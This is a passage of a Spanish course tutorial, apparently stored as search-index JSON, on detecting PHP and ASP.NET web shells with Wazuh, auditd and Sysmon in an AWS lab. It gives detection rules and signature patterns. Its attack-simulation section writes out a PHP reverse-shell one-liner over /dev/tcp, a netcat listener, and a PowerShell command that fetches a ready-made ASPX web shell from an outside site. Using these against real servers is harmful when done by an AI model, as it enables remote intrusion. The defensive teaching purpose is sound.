las expresiones regulares que contiene el archivo regexes.json, as\u00ed como se\u00f1alando en concreto los resultados de nuestra propia expresi\u00f3n regular.</p> <p>Utiliza todas las capturas de pantallas y explicaciones que consideres necesarias para este caso y el anterior.</p>"},{"location":"segdef/wazuh/","title":"Detecci\u00f3n de webshells con Wazuh","text":""},{"location":"segdef/wazuh/#que-es-wazuh","title":"\u00bfQu\u00e9 es Wazuh?","text":"<p>Wazuh, en palabras de su creador, el espa\u00f1ol Santiago Basset, es una proyecto open source que trata de prevenir, detectar y responder a amenazas.</p> <p>T\u00e9cnicamente podr\u00eda considerarse un HIDS (Host Intrusion Detection System). Estos dispositivos usualmente centraban la importancia en los eventos en la red. Sin embargo esta es una tendencia cambiante, como vemos en este gr\u00e1fico de ejemplo de MITRE:</p> <p></p> <p>As\u00ed pues, Wazuh quiz\u00e1s se acerque m\u00e1s a un XDR o un SIEM.</p>"},{"location":"segdef/wazuh/#web-shells","title":"Web shells","text":"<p>Los cibercriminales utilizan diferentes t\u00e9cnicas para conseguir la persistencia en un sistema previamente comprometido. Una de estas t\u00e9cnicas son las web shells.</p>"},{"location":"segdef/wazuh/#que-son-las-webshells","title":"\u00bfQu\u00e9 son las webshells?","text":"<p>Son scripts web que permiten a los atacantes acceso remoto sin restricciones. Puede pasar que un atacante logra comprometer un servidor, consiguiendo el acceso inicial al servicio web mediante alguna t\u00e9cnica ya conocida (SQLi, XSS, RFI...).</p> <p>Con este compromiso inicial, se puede intentar realizar la inyecci\u00f3n de una web shell en el directorio del servidor y que constituir\u00e1 un backdoor que dar\u00e1 paso a actividades post-explotaci\u00f3n (ejecuci\u00f3n de comandos, exfiltraci\u00f3n de informaci\u00f3n, infecci\u00f3n de malware...).</p> <p></p> <p>La mayor\u00eda de los web shells siguen los mismos principios de dise\u00f1o y e intenciones. Normalmente suelen estar escritos en lenguajes soportados por los servidores web: PHP, ASP, ASP.NET, Perl, Python...</p>"},{"location":"segdef/wazuh/#indicadores-comunes-de-los-web-shells","title":"Indicadores comunes de los web shells","text":"<ul> <li>Archivos subidos o modificados recientemente: los atacantes suelen subir sus web shells en los directorios utilizados por los servidores web o modificar archivos ya presentes en ellos. Disonancias en las fechas de modificaci\u00f3n pueden ser un indicativo.</li> <li>Conexiones de red inusuales: las web shell puede que tengan que poner determinados puertos a la escucha para establecer reverse shells o shells inversas hacia los atacantes. Esto producir\u00e1 tr\u00e1fico inusual (TCP o UDP), que puede ser un indicador de compromiso.</li> <li>Configuraciones extra\u00f1as/err\u00f3neas y cabeceras modificadas: cabeceras cl\u00e1siscas de las peticiones HTTP son user-agent o referer. Los atacantes pueden realizar la modificaci\u00f3n de estas cabeceras de tal forma que se intente una ejecuci\u00f3n de comandos mediante ellas.</li> <li>T\u00e9cnicas de ofuscaci\u00f3n: puede que el atacante emplee t\u00e9cnicas de codificaci\u00f3n, compresi\u00f3n o sustituci\u00f3n para intentar ser detectado por los sitemas de seguridad.</li> </ul>"},{"location":"segdef/wazuh/#manos-a-la-obra-configuracion-del-laboratorio","title":"Manos a la obra, configuraci\u00f3n del laboratorio","text":"<p>Para este laboratorio utilizaremos AWS, por la versatilidad que nos ofrece y as\u00ed deshacernos de los problemas de infraestructa a los que pueda limitarnos nuestra m\u00e1quina. Se van a utilizar 4 m\u00e1quinas:</p> <ol> <li>Amazon Linux 2: para instalar el servidor de Wazuh.</li> <li>Ubuntu: como v\u00edctima endpoint que est\u00e1 ejecutando un agente de Wazuh. Correr\u00e1 un servidor Apache para aplicaciones PHP.</li> <li>Windows Server 2022: otra v\u00edctima endpoint ejecutadno otro agente de Wazuh. Correr\u00e1 un servidor IIS para aplicaciones ASP.NET.</li> <li>Debian: como m\u00e1quina atacante.</li> </ol>"},{"location":"segdef/wazuh/#wazuh-server-en-amazon-linux-2","title":"Wazuh server en Amazon Linux 2","text":"<p>La instalaci\u00f3n del servidor de Wazuh o Wazuh manager se puede realizar siguiendo este sencillo tutorial.</p>"},{"location":"segdef/wazuh/#agente-wazuh-en-ubuntu-2204","title":"Agente Wazuh en Ubuntu 22.04","text":"<p>Los pasos vienen detallados aqu\u00ed</p> <p>Atenci\u00f3n<p>Elegid la pesta\u00f1a APT, que es la que os dar\u00e1 las indicaciones para realizar las acciones con el gestor de paquetes correspondiente.</p> </p>"},{"location":"segdef/wazuh/#agente-de-wazuh-en-windows-server-2022","title":"Agente de Wazuh en Windows Server 2022","text":"<p>En este caso las instrucciones est\u00e1n aqu\u00ed y os dar\u00e1 la opci\u00f3n, en las pesta\u00f1as, de elegir una instalaci\u00f3n gr\u00e1fica o por l\u00ednea de comandos.</p> <p>Atenci\u00f3n<p>Recordad poner como IP de Wazuh manager la de vuestro server de Wazuh.</p> </p>"},{"location":"segdef/wazuh/#servidor-web-apache-en-endpoint-ubuntu","title":"Servidor web Apache en endpoint Ubuntu","text":"<p>Pasos a seguir:</p> <ol> <li> <p>Instalar Apache:</p> <pre><code>$ sudo apt-get update\n$ sudo apt-get install apache2\n</code></pre> </li> <li> <p>Instalar PHP 8.1 para poder correr aplicaciones PHP</p> <pre><code>$ sudo apt-get install --no-install-recommends php8.1\n</code></pre> <p>As\u00ed evitaremos instalar paquetes adicionales.</p> </li> <li> <p>Para verificar la instalaci\u00f3n podemos acceder a la URL: <code>http://IP_UBUNTU_ENDPOINT</code>y nos mostrar\u00e1 la p\u00e1gina por defecto de Apache.</p> </li> </ol>"},{"location":"segdef/wazuh/#servidor-web-iis-en-endpoint-windows-server","title":"Servidor web IIS en endpoint Windows Server","text":"<p>Para proceder con esta instalaci\u00f3n:</p> <ol> <li> <p>En el men\u00fa de inicio de Windows, escribimos <code>appwiz.cpl</code> y le decimos Turn Windows features on or off:</p> <p></p> </li> <li> <p>En Server Roles instalamos Web Server (IIS) conm, al menos, las siguientes funciones:</p> <p></p> </li> <li> <p>Para verificar la instalaci\u00f3n accedemos a la URL: <code>http://IP_WINDOWS_ENDPOINT</code></p> </li> </ol> <p>\u00a1Atenci\u00f3n, importante!</p> <p>En la comunicaci\u00f3n entre los agentes y el servidor intervienen distintos puertos. La forma f\u00e1cil de evitaros todo problema es a\u00f1adir una regla de seguridad a todas las m\u00e1quinas donde se permite cualquier conexi\u00f3n entrante (TCP/UDP, cualquier puerto) desde la red 172.31.0.0/16. </p> <p>Esto no supone un gran problema de seguridad puesto que es el segmento de red privado que nos asigna AWS Academy por defecto. En esencia lo que hacemos es dejar que todas las m\u00e1quinas dentro de esa red se comuniquen sin cortapisas.</p>"},{"location":"segdef/wazuh/#escenario-hipotetico","title":"Escenario hipot\u00e9tico","text":"<p>El endpoint Ubuntu corre un Apache con PHP instalado y el endpoint Windows Server corre un servidor web IIS, capaz de interpretar c\u00f3digo ASP.NET.</p> <p>Puesto que las web shells se consideran malware post-explotaci\u00f3n, hemos de asumir que el atcante ya posee acceso inicial a los endpoints. Lo que el atacante desea conseguir es la persistencia en el sistema comprometido con el fin de llevar a cabo estas labores de  post-explotaci\u00f3n.</p>"},{"location":"segdef/wazuh/#tecnicas-de-deteccion","title":"T\u00e9cnicas de detecci\u00f3n","text":"<p>Utilizaremos distintas capacidades de Wazuh para detectar la presencia de web shells en PHP o ASP.NET.</p>"},{"location":"segdef/wazuh/#integridad-de-ficheros","title":"Integridad de ficheros","text":"<p>Utilizaremos FIM (File Integritiy Monitorint) para deteta rla creaci\u00f3n y modificaci\u00f3n de archivos que contengan web shells.</p> <p>El m\u00f3dulo FIM de Wazuih puede detectar, casi en tiempo real, cambios en los archivos accesibles via web y de esta forma alertar a los administradores.</p> <p>Usaremos este m\u00f3dulo para detectar cuando se han creado o odificado archivos en <code>/var/wwww/html</code>y en <code>C:\\inetpub\\wwwroot</code>, directorios raiz por defecto en Ubuntu y Windows respectivamente.</p> <p>Adem\u00e1s, FIM escanea los contenidos de los archivos para monitorizar la aparci\u00f3n de firmas de web shells cuando los archivos se modifican.</p>"},{"location":"segdef/wazuh/#configuracion-de-ubuntu","title":"Configuraci\u00f3n de Ubuntu","text":"<ol> <li> <p>A\u00f1adir la siguiente configuraci\u00f3n al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p> <p><pre><code>&lt;directories realtime=\"yes\" check_all=\"yes\" report_changes=\"yes\"&gt;/var/www/html&lt;/directories&gt;\n</code></pre> Esto detecta los cambios en el directorio <code>/var/www/html</code>.</p> </li> <li> <p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-agent\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#configuracion-de-windows","title":"Configuraci\u00f3n de Windows","text":"<ol> <li> <p>A\u00f1adir la siguiente configuraci\u00f3n al agente de Wazu en el archivo <code>C:\\Program Files (x86)\\ossec-agent\\ossec.conf</code>, dentro del bloque <code>&lt;syscheck&gt;</code>:</p> <pre><code>&lt;directories realtime=\"yes\" check_all=\"yes\" report_changes=\"yes\"&gt;C:\\inetpub\\wwwroot&lt;/directories&gt;\n</code></pre> </li> <li> <p>Corriendo una terminal de Powershell como administrador, reinicia el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>&gt; Restart-Service -Name wazuh\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#configuracion-del-servidor-de-wazuh","title":"Configuraci\u00f3n del servidor de Wazuh","text":"<ol> <li> <p>Crear un archivo de reglas personalizado <code>reglas_webshell.xml</code> en el directorio <code>/var/ossec/etc/rules/</code> y colocar en \u00e9l las siguientes reglas:</p> reglas_Webshell.xml<pre><code>&lt;group name=\"linux, webshell, windows,\"&gt;\n&lt;!-- Esta regla detecta la creaci\u00f3n de archivos --&gt;\n&lt;rule id=\"100500\" level=\"12\"&gt;\n&lt;if_sid&gt;554&lt;/if_sid&gt;\n&lt;field name=\"file\" type=\"pcre2\"&gt;(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$&lt;/field&gt;\n&lt;description&gt;[File creation]: Possible web shell scripting file ($(file)) created&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1105&lt;/id&gt;\n&lt;id&gt;T1505&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n\n&lt;!-- Esta regla detecta la modificaci\u00f3n de archivos --&gt;\n&lt;rule id=\"100501\" level=\"12\"&gt;\n&lt;if_sid&gt;550&lt;/if_sid&gt;\n&lt;field name=\"file\" type=\"pcre2\"&gt;(?i).php$|.phtml$|.php3$|.php4$|.php5$|.phps$|.phar$|.asp$|.aspx$|.jsp$|.cshtml$|.vbhtml$&lt;/field&gt;    &lt;description&gt;[File modification]: Possible web shell content added in $(file)&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1105&lt;/id&gt;\n&lt;id&gt;T1505&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n\n&lt;!-- Esta regla detecta la modificaci\u00f3n de archivos con firmas asociadas a web shells de PHP --&gt;\n&lt;rule id=\"100502\" level=\"15\"&gt;\n&lt;if_sid&gt;100501&lt;/if_sid&gt;\n&lt;field name=\"changed_content\" type=\"pcre2\"&gt;(?i)passthru|exec|eval|shell_exec|assert|str_rot13|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readfile|show_source|proc_open|pcntl_exec|execute|WScript.Shell|WScript.Network|FileSystemObject|Adodb.stream&lt;/field&gt;\n&lt;description&gt;[File Modification]: File $(file) contains a web shell&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1105&lt;/id&gt;\n&lt;id&gt;T1505.003&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> </li> <li> <p>Reiniciar Wazuh manager para aplicar la configuraci\u00f3n de los cambios</p> <pre><code>$ sudo systemctl restart wazuh-manager\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#usando-reglas-personalizadas-para-detectar-indicios-de-web-shells","title":"Usando reglas personalizadas para detectar indicios de web shells","text":"<p>Wazuh permite escribir reglas personalizadas que disparan alertas cuando se detectan determinadas caracter\u00edsticas en logs. Adem\u00e1s integraremos Wazuh con auditd en endpoints Linux y Sysmon en Windows para enriquecer los fuentes de logs, para as\u00ed mejorar la seguridad.</p>"},{"location":"segdef/wazuh/#ubuntu","title":"Ubuntu","text":"<p>Auditd (de Linux Audit Daemon) es una utilidad que recopila y almacena eventos del sistema tales como llamadas al sistema (syscall) y funciones. Usando auditd podemos monitorizar comandos del sistema as\u00ed como conexciones de red que lleve a cabo un usuario de servidor web, escribiendo reglas que generen una alerta cuando esto ocurra.</p> <p>As\u00ed las cosas:</p> <ol> <li> <p>Actualizar los paquetes de los respositorios e instalar auditd:</p> <pre><code>$ sudo apt update\n$ sudo apt install auditd\n</code></pre> </li> <li> <p>Enviar los logs de auditd al servidor de Wazuh para su an\u00e1lisis, a\u00f1adiendo para ello la siguiente configuraci\u00f3n al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>:</p> <pre><code>&lt;ossec_config&gt;\n&lt;localfile&gt;\n&lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;\n&lt;log_format&gt;audit&lt;/log_format&gt;\n&lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> </li> <li> <p>Obtener el identificador dle usuario del servidor web Apache ejecutando el siguiente comando:</p> <pre><code>$ sudo apachectl -S\n</code></pre> Salida <pre><code>VirtualHost configuration:\n*:80                   127.0.1.1 (/etc/apache2/sites-enabled/000-default.conf:1)\nServerRoot: \"/etc/apache2\"\nMain DocumentRoot: \"/var/www/html\"\nMain ErrorLog: \"/var/log/apache2/error.log\"\nMutex mpm-accept: using_defaults\nMutex watchdog-callback: using_defaults\nMutex default: dir=\"/var/run/apache2/\" mechanism=default \nPidFile: \"/var/run/apache2/apache2.pid\"\nDefine: DUMP_VHOSTS\nDefine: DUMP_RUN_CFG\nUser: name=\"www-data\" id=33\nGroup: name=\"www-data\" id=33\n</code></pre> </li> <li> <p>A\u00f1adir al archivo de configuraci\u00f3n de auditd <code>/etc/audit/rules.d/audit.rules</code>, usando el id de usuario en el paso 3, lo siguiente:</p> <pre><code>## Auditd rules that detect command execution from user www-data.\n-a always,exit -F arch=b32 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec\n-a always,exit -F arch=b64 -S execve -F uid=&lt;USER_ID&gt; -F key=webshell_command_exec\n\n## Auditd rules that detect network connections from user www-data.\n-a always,exit -F arch=b64 -S socket -F a0=10 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n-a always,exit -F arch=b64 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n-a always,exit -F arch=b32 -S socket -F a0=10 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n-a always,exit -F arch=b32 -S socket -F a0=2 -F euid=&lt;USER_ID&gt; -k webshell_net_connect\n</code></pre> </li> <li> <p>Reiniciar auditd y el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> </li> </ol> <pre><code>$ sudo systemctl restart auditd\n$ sudo systemctl restart wazuh-agent\n</code></pre>"},{"location":"segdef/wazuh/#windows","title":"Windows","text":"<p>System Monitor (Sysmon) es un servicio de sistema de Windows que monitoriza y registra la actividad del sistema en los logs de eventos de Windows.</p> <p>Complementa los logs con informaci\u00f3n detallada sobre la creaci\u00f3n de procesos o conexiones de red, entre otros. Por ejemplo, Sysmon puede monitorizar el proceso <code>w3wp.exe,</code>componente fundamental del servidor web de Microsoft Internet Information Services (IIS). Este proceso se encarga de manejar las solicitudes HTTP recibidas por el servidor web y de procesarlas para generar las respuestas correspondientes.</p> <p>IIS tiene una funcionalidad de seguridad llamada application pool que permite que un pool de aplicaciones se ejecuten \u00fanicamente con una \u00fanica cuenta, cuyo nombre por defecto es <code>DefaultAppTool</code>. </p> <p>Con esta cuenta, el proceso de IIS corre exclusivamente con privilegios de usuario. Los atacantes suelen aprovechar este proceso para abrir terminales de PowerShell o cmd. </p> <p>Explicado lo anterior, para configurar Sysmon y que Wazuh procese sus logs, haremos:</p> <ol> <li> <p>Descargar en nuestra m\u00e1quina Windows el instalador de Sysmon y el archivo de configuraci\u00f3n que necesitamos</p> </li> <li> <p>Instalar Sysmon, usando la configuraci\u00f3n descargada, mediante un terminal de PowerShell corriendo con privilegios de administrador:</p> </li> </ol> <pre><code>&gt; .\\Sysmon64.exe -accepteula -i sysmonconfig.xml\n</code></pre> <ol> <li>A\u00f1adir las siguientes l\u00edneas de configuraci\u00f3n al archivo <code>C:\\Program Files (x86)\\ossec-agent\\ossec.conf</code>, encargado de la captura y redireci\u00f3n de logs de Sysmon hacia el servidor de Wazuh:</li> </ol> <pre><code>&lt;ossec_config&gt;\n&lt;localfile&gt;\n&lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;\n&lt;log_format&gt;eventchannel&lt;/log_format&gt;\n&lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> <ol> <li> <p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>&gt; Restart-Service -Name wazuh\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#amazon-linux-2-wazuh-server","title":"Amazon Linux 2 (Wazuh server)","text":"<ol> <li> <p>A\u00f1adir al archivo de configuraci\u00f3n <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intenta detectar comandos ejecutados por una web shell, as\u00ed como conexiones de red establecidas:</p> reglas_webshell.xml <pre><code>&lt;!-- Reglas Linux. --&gt;\n&lt;group name=\"auditd, linux, webshell,\"&gt;\n&lt;!-- Eta regla detecta comandos ejecutados por una web shell --&gt;\n&lt;rule id=\"100520\" level=\"12\"&gt;\n&lt;if_sid&gt;80700&lt;/if_sid&gt;\n&lt;field name=\"audit.key\"&gt;webshell_command_exec&lt;/field&gt;\n&lt;description&gt;[Command execution ($(audit.exe))]: Possible web shell attack detected&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1505.003&lt;/id&gt;\n&lt;id&gt;T1059.004&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;!-- Esta regla detecta conexiones de red realizadas por una web shell --&gt;\n&lt;rule id=\"100521\" level=\"12\"&gt;\n&lt;if_sid&gt;80700&lt;/if_sid&gt;\n&lt;field name=\"audit.key\"&gt;webshell_net_connect&lt;/field&gt;\n&lt;description&gt;[Network connection via $(audit.exe)]: Possible web shell attack detected&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;TA0011&lt;/id&gt;\n&lt;id&gt;T1049&lt;/id&gt;\n&lt;id&gt;T1505.003&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;/group&gt;\n\n&lt;!-- Reglas Windows --&gt;\n&lt;group name=\"sysmon, webshell, windows,\"&gt;\n&lt;!-- Esta regla detecta comandos ejecutados por una web shell  --&gt;\n&lt;rule id=\"100530\" level=\"12\"&gt;\n&lt;if_sid&gt;61603&lt;/if_sid&gt;\n&lt;field name=\"win.eventdata.parentImage\" type=\"pcre2\"&gt;(?i)w3wp\\.exe&lt;/field&gt;\n&lt;field name=\"win.eventdata.parentUser\" type=\"pcre2\"&gt;(?i)IIS\\sAPPPOOL\\\\\\\\DefaultAppPool&lt;/field&gt;\n&lt;description&gt;[Command execution ($(win.eventdata.commandLine))]: Possible web shell attack detected&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;T1505.003&lt;/id&gt;\n&lt;id&gt;T1059.004&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n\n&lt;!-- Esta regla detecta conexiones de red realizadas por una web shell --&gt;\n&lt;rule id=\"100531\" level=\"12\"&gt;\n&lt;if_sid&gt;61605&lt;/if_sid&gt;\n&lt;field name=\"win.eventdata.image\" type=\"pcre2\"&gt;(?i)w3wp\\.exe&lt;/field&gt;\n&lt;field name=\"win.eventdata.user\" type=\"pcre2\"&gt;(?i)IIS\\sAPPPOOL\\\\\\\\DefaultAppPool&lt;/field&gt;\n&lt;description&gt;[Network connection]: Possible web shell attempting network connection on source port: $(win.eventdata.sourcePort) and destination port: $(win.eventdata.destinationPort)&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;TA0011&lt;/id&gt;\n&lt;id&gt;T1049&lt;/id&gt;\n&lt;id&gt;T1505.003&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> </li> <li> <p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-manager\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#usando-monitorizacion-de-comandos-para-detectar-las-conexiones-de-red-de-un-posible-ataque","title":"Usando monitorizaci\u00f3n de comandos para detectar las conexiones de red de un posible ataque","text":"<p>En esta secci\u00f3n usaremos la monitorizaci\u00f3n de comandos para complementar el uso de auditd en el endpoint Linux. Nos servir\u00e1 para obtener informaci\u00f3n adicional sobre las direcciones IP/puertos desde los que se originan los ataques.</p>"},{"location":"segdef/wazuh/#ubuntu_1","title":"Ubuntu","text":"<ol> <li> <p>A\u00f1adir las siguientes configuraciones al archivo de configuraci\u00f3n del agente Wazuh <code>/var/ossec/etc/ossec.conf</code>. Esto determina el comando que se ejecutar\u00e1 en el endpoint:</p> <p><pre><code>&lt;ossec_config&gt;\n&lt;localfile&gt;\n&lt;log_format&gt;full_command&lt;/log_format&gt;\n&lt;command&gt;ss -nputw | egrep '\"sh\"|\"bash\"|\"csh\"|\"ksh\"|\"zsh\"' | awk '{ print $5 \"|\" $6 }'&lt;/command&gt;\n&lt;alias&gt;webshell connections&lt;/alias&gt;\n&lt;frequency&gt;120&lt;/frequency&gt;\n&lt;/localfile&gt;\n&lt;/ossec_config&gt;\n</code></pre> 2.  Reiniciar el agente de Wazuh par aplicar los cambios de configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-agent\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#amazon-linux-2-wazuh-server_1","title":"Amazon Linux 2 (Wazuh server)","text":"<ol> <li> <p>A\u00f1adir, en el archivo de configuraci\u00f3n <code>/var/ossec/etc/decoders/local_decoder.xml</code> los siguientes decodificadores para decodificar patrones de conexiones de red establecidas por web shells en los servidores web:</p> <pre><code>&lt;!-- Decodificar para las conexiones de red de web shells --&gt;\n&lt;decoder name=\"network-traffic-child\"&gt;\n&lt;parent&gt;ossec&lt;/parent&gt;\n&lt;prematch offset=\"after_parent\"&gt;^output: 'webshell connections':&lt;/prematch&gt;\n&lt;regex offset=\"after_prematch\" type=\"pcre2\"&gt;(\\d+.\\d+.\\d+.\\d+):(\\d+)\\|(\\d+.\\d+.\\d+.\\d+):(\\d+)&lt;/regex&gt;\n&lt;order&gt;local_ip, local_port, foreign_ip, foreign_port&lt;/order&gt;\n&lt;/decoder&gt;\n</code></pre> </li> <li> <p>A\u00f1adir al archivo de configuraci\u00f3n <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intentna detectar conexiones de red establecidas por web shells en los servidores web:</p> <pre><code>&lt;!-- Regla detectar conexiones red web shells --&gt;\n&lt;group name=\"linux, webshell,\"&gt;\n&lt;rule id=\"100510\" level=\"12\"&gt;\n&lt;decoded_as&gt;ossec&lt;/decoded_as&gt;\n&lt;match&gt;ossec: output: 'webshell connections'&lt;/match&gt;\n&lt;description&gt;[Network connection]: Script attempting network connection on source port: $(local_port) and destination port: $(foreign_port)&lt;/description&gt;\n&lt;mitre&gt;\n&lt;id&gt;TA0011&lt;/id&gt;\n&lt;id&gt;T1049&lt;/id&gt;\n&lt;id&gt;T1505.003&lt;/id&gt;\n&lt;/mitre&gt;\n&lt;/rule&gt;\n&lt;/group&gt;\n</code></pre> </li> <li> <p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuraci\u00f3n:</p> <pre><code>$ sudo systemctl restart wazuh-manager\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#simulacion-de-ataque","title":"Simulaci\u00f3n de ataque","text":"<p>A continuaci\u00f3n se detallan los pasos para simular como funcionan las web shells en los endpoints comprometidos.</p>"},{"location":"segdef/wazuh/#pasos-para-simular-el-ataque-contra-el-endpoint-ubuntu","title":"Pasos para simular el ataque contra el endpoint Ubuntu","text":""},{"location":"segdef/wazuh/#ubuntu_2","title":"Ubuntu","text":"<p>Ejecutar los siguientes pasos con privilegio de root.</p> <ol> <li> <p>Crear un archivo, por ejemplo <code>webshell.php</code> en el directorio del servidor web <code>/var/www/html</code> con la siguiente l\u00ednea de c\u00f3digo que ejecutar\u00e1 una shell inversa:</p> <pre><code>echo -e \"&lt;?php exec('/bin/bash -c \\\"bash -i &gt;&amp; /dev/tcp/&lt;IP_DEBIAN&gt;/4444 0&gt;&amp;1\\\"');?&gt;\" &gt; /var/www/html/webshell.php\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#debian","title":"Debian","text":"<ol> <li> <p>En el terminal de nuestra Debian utilizaremos netcat (nc, instaladlo si no lo est\u00e1) para escuchar conexiones en el puerto 4444:</p> <pre><code>$ nc -nlvp 4444\n</code></pre> </li> <li> <p>Ejecutar la web shell desde nuestro navegador accediendo a la URL <code>http://&lt;IP_UBUNTU&gt;/webshell.php</code>, de tal forma que se establezca una shell inversa con el endpoint Ubuntu hacia nuestra Debian atacante.</p> </li> <li> <p>En el terminal que nos aparecer\u00e1 en el netcat de nuestra Debian, ejecutar varios comandos tales como <code>id</code>, <code>cat /etc/passwd</code>, <code>whoami</code>...</p> </li> </ol>"},{"location":"segdef/wazuh/#ver-las-alertas","title":"Ver las alertas","text":"<p>En el dashboard de Wazuh, navegar a Security events y visualizar las alertas generadas:</p>"},{"location":"segdef/wazuh/#pasos-para-simular-el-ataque-contra-el-endpoint-windows","title":"Pasos para simular el ataque contra el endpoint Windows","text":""},{"location":"segdef/wazuh/#windows_1","title":"Windows","text":"<p>Atenci\u00f3n</p> <p>Es m\u00e1s que probable que necesit\u00e9is desactivar el antivirus y la detecci\u00f3n de amenazas de Windows para que os funcione esta parte.</p> <p>Ejecutar los siguientes pasos en una terminal de PowerShell ejecut\u00e1ndose como administrador:</p> <ol> <li> <p>Descargar una copia de una web shell en el directorio del servidor web <code>C:\\inetput\\wwwroot</code> y llamarla, por ejemplo, <code>webshell.aspx</code>:</p> <pre><code>&gt; Invoke-WebRequest -OutFile 'C:\\Users\\Public\\Downloads\\webshell.aspx' -Uri https://privdayz.com/cdn/txt/aspx.txt\n&gt; copy 'C:\\Users\\Public\\Downloads\\webshell.aspx' 'C:\\inetpub\\wwwroot\\webshell.aspx'\n</code></pre> </li> </ol>"},{"location":"segdef/wazuh/#debian_1","title":"Debian","text":"<ol> <li> <p>En el terminal de nuestra Debian escuchamos conexiones en el puerto 4444:</p> <pre><code>$ nc -nlvp 4444\n</code></pre> </li> <li> <p>Acceder a la web shell desde nuestro navegador mediante la URL <code>http://&lt;IP_WINDOWS&gt;/webshell.aspx</code>.</p> <p>La contrase\u00f1a de la web shell es admin. En el men\u00fa CmdShell, ejecuta comandos tales como <code>whoami</code>, <code>ipconfig</code>...</p> </li> <li> <p>En el men\u00fa PortMap, introducir la IP de nuestra Debian como Remote IP, <code>4444</code> como Remote Port y <code>5555</code> como Local Port. Tras ello, pulsar MapPort</p> </li> </ol>"},{"location":"segdef/wazuh/#ver-las-alertas_1","title":"Ver las alertas","text":"<p>En el dashboard de Wazuh, navegar a Security events y visualizar las alertas generadas:</p>"},{"location":"segdef/wazuh/#recapitulacion-y-conclusiones","title":"Recapitulaci\u00f3n y conclusiones","text":"<ul> <li> <p>Las web shells de cualquier tipo suelen tener comportamientos similares, esto es, crean o modifican archivos presentes en los directorios de los servidores web, realizando conexiones de red para establecer shells inversas y ejecutando comandos para tareas post-explotaci\u00f3n.</p> </li> <li> <p>Con Wazuh podemos ser capaces de detectar estas web shells, usando FIM y la monitorizaci\u00f3n de comandos</p> </li> <li> <p>Tambi\u00e9n hemos realizado la integraci\u00f3n de auditd y Sysmon con Wazuh, aportando as\u00ed m\u00e1s informaci\u00f3n a los logs, siendo capaces de realizar una mejor detecci\u00f3n en los endpoints comprometidos</p> </li> <li> <p>No obstante, es recomendable que las organizaciones adem\u00e1s tengan en marcha defensas contra las tareas de post-explotaci\u00f3n como puedan ser el escaneo y parcheo de sistemas y aplicaciones vulnerables, as\u00ed como pol\u00edticas de seguridad que monitoricen malas configuraciones de los sistemas.</p> </li> </ul>"},{"location":"segdef/wazuh/#anexo-despliegue-de-instancias-ec2-linux-y-windows-en-aws","title":"Anexo: despliegue de instancias EC2 Linux y Windows en AWS","text":"<p>Una vez tenemos creados nuestro laboratorio (Learner Lab)en AWS Academy, podremos hacer uso de varios servicios de Amazon Web Services, dentro de unos l\u00edmites, aunque estos l\u00edmites no nos afectan para nuestro prop\u00f3sito.</p> <p>Amazon ofrece una cantidad ingente de servicios que pod\u00e9is consultar en los cap\u00edtulos 1, 3 y 9 del curso de AWS Foundations. Uno de estos servicios es el de computaci\u00f3n, es decir, la creaci\u00f3n de instancias EC2 (Elastic Compute Cloud). Esto no es m\u00e1s que la creaci\u00f3n de m\u00e1quinas virtuales en la nube, lo cual nos es de extrema utilidad para el caso que nos ocupa.</p> <p>A continuaci\u00f3n se mostrar\u00e1 detalladamente el proceso de creaci\u00f3n de instancias Linux y Windows, as\u00ed como la forma de conectarse a dichas instancias.</p>"},{"location":"segdef/wazuh/#ec2-linux","title":"EC2 Linux","text":"<p>En primer lugar deb\u00e9is entrar en vuestro Learner Lab y acceder a los contenidos:</p> <p></p> <p>E ir a la 